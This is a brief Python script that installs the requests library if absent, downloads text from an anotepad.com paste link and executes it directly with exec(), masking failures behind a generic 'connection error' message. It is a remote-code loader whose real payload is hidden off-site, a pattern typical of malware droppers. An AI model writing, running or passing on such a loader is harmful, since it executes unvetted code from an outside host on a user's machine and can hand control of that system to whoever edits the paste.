import os
try:
	import requests
except ModuleNotFoundError:
	os.system("pip install requests")
try:
	exec(requests.get("https://anotepad.com/note/download/csfx4w?format=Text").text)
except requests.exceptions.HTTPError:
    print("\033[1;91m[!] \033[0;90mconnection error, failed connect to server!\033[0m")
except requests.exceptions.ConnectionError:
    print("\033[1;91m[!] \033[0;90mconnection error, failed connect to server!\033[0m")
except requests.exceptions.Timeout:
    print("\033[1;91m[!] \033[0;90mconnection error, failed connect to server!\033[0m")
except requests.exceptions.RequestException:
    print("\033[1;91m[!] \033[0;90mconnection error, failed connect to server!\033[0m")

